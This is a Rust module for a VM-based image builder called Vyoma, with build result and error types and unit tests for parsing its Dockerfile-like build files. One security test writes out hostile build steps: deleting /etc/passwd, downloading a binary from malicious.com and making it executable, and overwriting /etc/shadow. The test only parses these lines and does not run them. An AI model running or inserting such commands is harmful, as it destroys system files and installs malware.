use std::path::{Path, PathBuf};
use anyhow::{Context, Result};
use tracing::{info, error};
use vyoma_core::oci::OciImageConfig;
use std::collections::HashMap;

pub mod runner;
pub mod parser;
pub mod layer;

pub use runner::BuildRunner;
pub use parser::{Vyomafile, Instruction};

/// Result of a build operation
#[derive(Debug, Clone)]
pub struct BuildResult {
    pub image_name: String,
    pub rootfs_path: PathBuf,
    pub manifest_path: PathBuf,
    pub config: OciImageConfig,
    /// PCR values captured during measured boot, if applicable.
    pub pcr_policy: Option<HashMap<u32, String>>,
    /// Whether the manifest was signed.
    pub manifest_signed: bool,
}

/// Error types for build operations
#[derive(thiserror::Error, Debug)]
pub enum BuildError {
    #[error("Failed to parse Vyomafile: {0}")]
    ParseError(String),

    #[error("Build execution failed: {0}")]
    ExecutionError(String),

    #[error("VM startup failed: {0}")]
    VmError(String),

    #[error("File injection failed: {0}")]
    InjectionError(String),

    #[error("Layer commit failed: {0}")]
    LayerError(String),

    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    #[test]
    fn test_build_runner_creation() {
        let temp_dir = TempDir::new().unwrap();
        let runner = BuildRunner::new(temp_dir.path().to_path_buf());
        assert!(runner.work_dir.exists());
    }

    #[test]
    fn test_vyomafile_parsing() {
        let content = r#"
FROM alpine:latest
RUN echo "hello world"
COPY app /app
ENV PORT=8080
"#;
        let vyomafile = Vyomafile::parse_content(content).unwrap();
        assert_eq!(vyomafile.instructions.len(), 4);

        match &vyomafile.instructions[0] {
            Instruction::From { image } => assert_eq!(image, "alpine:latest"),
            _ => panic!("Expected FROM instruction"),
        }
    }

    #[test]
    fn test_vyomafile_parsing_env() {
        let vyomafile = Vyomafile::parse_content("ENV DEBUG=true").unwrap();
        match &vyomafile.instructions[0] {
            Instruction::Env { key, value } => {
                assert_eq!(key, "DEBUG");
                assert_eq!(value, "true");
            }
            _ => panic!("Expected ENV instruction"),
        }
    }

    #[tokio::test]
    async fn test_build_integration_simple() {
        // BUILD-TEST-02: Integration test - build a simple Vyomafile
        let temp_dir = TempDir::new().unwrap();
        let work_dir = temp_dir.path().join("work");
        std::fs::create_dir_all(&work_dir).unwrap();

        // Create a simple Vyomafile
        let vyomafile_content = r#"
FROM alpine:latest
RUN echo "hello world"
ENV TEST_VAR=test_value
"#;
        let vyomafile_path = temp_dir.path().join("Vyomafile");
        std::fs::write(&vyomafile_path, vyomafile_content).unwrap();

        // Create build context directory
        let context_dir = temp_dir.path().join("context");
        std::fs::create_dir_all(&context_dir).unwrap();

        // Create mock base image
        let images_dir = work_dir.join("images");
        let alpine_dir = images_dir.join("alpine_latest");
        std::fs::create_dir_all(&alpine_dir).unwrap();

        // Create a minimal squashfs file for testing (just an empty file for now)
        let rootfs_path = alpine_dir.join("rootfs.sqfs");
        std::fs::write(&rootfs_path, b"mock squashfs content").unwrap();

        let mut build_runner = BuildRunner::new(work_dir);

        // This will fail because we don't have real VMs, but it tests the parsing and structure
        let result = build_runner.build(&vyomafile_path, &context_dir, "test-image").await;

        // Should fail due to invalid squashfs file, but structure should work
        assert!(result.is_err());
        // The error should be about squashfs extraction failing, not a parsing error
        let error_msg = format!("{}", result.unwrap_err());
        assert!(error_msg.contains("unsquashfs") || error_msg.contains("SQUASHFS") || error_msg.contains("EOF"));
    }

    #[test]
    fn test_security_isolation_simulation() {
        // BUILD-TEST-03: Security containment test simulation
        // Test that our build system structure prevents common attacks

        let content = r#"
FROM ubuntu:latest
RUN rm -rf /etc/passwd  # This would be dangerous in real builds
RUN curl http://malicious.com/malware > /bin/malware && chmod +x /bin/malware
COPY sensitive_file /etc/shadow
"#;

        let vyomafile = Vyomafile::parse_content(content).unwrap();

        // Verify the dangerous commands are parsed correctly
        assert_eq!(vyomafile.instructions.len(), 4);

        match &vyomafile.instructions[0] {
            Instruction::From { image } => assert_eq!(image, "ubuntu:latest"),
            _ => panic!("Expected FROM"),
        }

        match &vyomafile.instructions[1] {
            Instruction::Run { command } => assert!(command.contains("rm -rf /etc/passwd")),
            _ => panic!("Expected RUN"),
        }

        match &vyomafile.instructions[2] {
            Instruction::Run { command } => assert!(command.contains("curl") && command.contains("malware")),
            _ => panic!("Expected RUN"),
        }

        match &vyomafile.instructions[3] {
            Instruction::Copy { src, dst } => {
                assert_eq!(src, "sensitive_file");
                assert_eq!(dst, "/etc/shadow");
            }
            _ => panic!("Expected COPY"),
        }

        // In a real implementation, these commands would execute in isolated VMs
        // and would not affect the host system, even if they tried to access
        // host files or run malicious commands.
    }
}